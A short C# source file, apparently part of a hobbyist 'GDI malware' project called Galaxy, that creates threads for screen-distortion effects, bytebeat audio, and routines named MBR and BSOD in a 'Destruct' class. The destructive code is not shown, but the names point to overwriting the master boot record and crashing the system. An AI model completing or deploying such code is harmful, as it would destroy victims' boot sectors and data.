using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using static Galaxy.GDI;
using static Galaxy.Bytebeats;
using static Galaxy.Destruct;

namespace Galaxy
{
    public class Threads
    {
        // Gdi Effects

        public static Thread texts = new Thread(Texts);
        public static Thread gdi1 = new Thread(GDI1);
        public static Thread gdi2 = new Thread(GDI2);
        public static Thread gdi3 = new Thread(GDI3);
        public static Thread gdi4 = new Thread(GDI4);
        public static Thread gdi5 = new Thread(GDI5);
        
        // Bytebeats

        public static Thread bytebeat1 = new Thread(Bytebeat1);
        public static Thread bytebeat2 = new Thread(Bytebeat2);
        public static Thread bytebeat3 = new Thread(Bytebeat3);

        // Destruct

        public static Thread mbr = new Thread(MBR);
        public static Thread BSOD = new Thread(bsod);
    }
}
